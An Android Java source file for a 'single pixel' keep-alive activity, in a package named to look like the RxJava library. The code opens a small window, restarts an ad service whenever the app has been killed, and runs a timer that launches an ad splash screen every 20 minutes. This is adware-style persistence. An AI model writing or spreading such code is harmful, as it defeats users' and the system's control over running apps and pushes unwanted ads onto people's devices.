package rxjava.reactivex.io.screen;

import android.content.Intent;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;

import java.util.Timer;
import java.util.TimerTask;

import rxjava.reactivex.io.utils.AdService;
import rxjava.reactivex.io.utils.AdSplashActivity;
import rxjava.reactivex.io.utils.Contants;
import rxjava.reactivex.io.utils.SystemUtils;

/**
 * 1像素Activity
 * <p>
 * Created by jianddongguo on 2017/7/8.
 */

public class SinglePixelActivity extends AppCompatActivity {
    private static final String TAG = "SinglePixelActivity";
    private Timer mRunTimer;
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        if (Contants.DEBUG)
            Log.d(TAG, "onCreate--->启动1像素保活");
        Window mWindow = getWindow();
        mWindow.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams attrParams = mWindow.getAttributes();
        attrParams.x = 0;
        attrParams.y = 0;
        attrParams.height = 300;
        attrParams.width = 300;
        mWindow.setAttributes(attrParams);
        // 绑定SinglePixelActivity到ScreenManager
        ScreenManager.getScreenManagerInstance(this).setSingleActivity(this);
        startRunTimer();
    }

    @Override
    protected void onDestroy() {
        if (Contants.DEBUG)
            Log.d(TAG, "onDestroy--->1像素保活被终止");
        if (!SystemUtils.isAPPALive(this, Contants.PACKAGE_NAME)) {
            Intent intentAlive = new Intent(this, AdService.class);
            intentAlive.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startService(intentAlive);
            Log.i(TAG, "SinglePixelActivity---->APP被干掉了，我要重启它");
        }
        super.onDestroy();
    }

    private void startRunTimer() {
        TimerTask mTask = new TimerTask() {
            @Override
            public void run() {
//                Log.e("AdService", System.currentTimeMillis() + "");
//                if (System.currentTimeMillis() - PrefsUtil.getLong(getApplicationContext(), "time") > 60 * 1000 * 5) {
//                    PrefsUtil.setLong(getApplicationContext(), "time", System.currentTimeMillis());
//                    Intent intent = new Intent(AdService.this, AdSplashActivity.class);
//                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                    startActivity(intent);
//                }
                Intent intent = new Intent(SinglePixelActivity.this, AdSplashActivity.class);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        };
        mRunTimer = new Timer();
        // 每隔1s更新一下时间
        mRunTimer.schedule(mTask, 1000, 1000*60*20);
    }
}
